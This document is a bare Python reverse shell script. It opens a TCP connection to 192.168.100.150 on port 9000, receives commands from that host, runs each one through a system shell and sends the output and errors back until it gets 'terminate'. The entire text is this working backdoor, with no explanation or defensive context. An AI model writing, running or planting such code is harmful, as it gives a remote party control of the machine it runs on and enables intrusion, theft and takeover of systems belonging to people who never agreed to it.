#!/usr/bin/env python

import socket
import subprocess


sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("192.168.100.150",9000))
while(1):
	command=sock.recv(2048)

	if 'terminate' in command:
		sock.send('terminate')
		break
	else:
		cmd = subprocess.Popen(command,shell=1,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
		sock.send(cmd.stdout.read())
		sock.send(cmd.stderr.read())


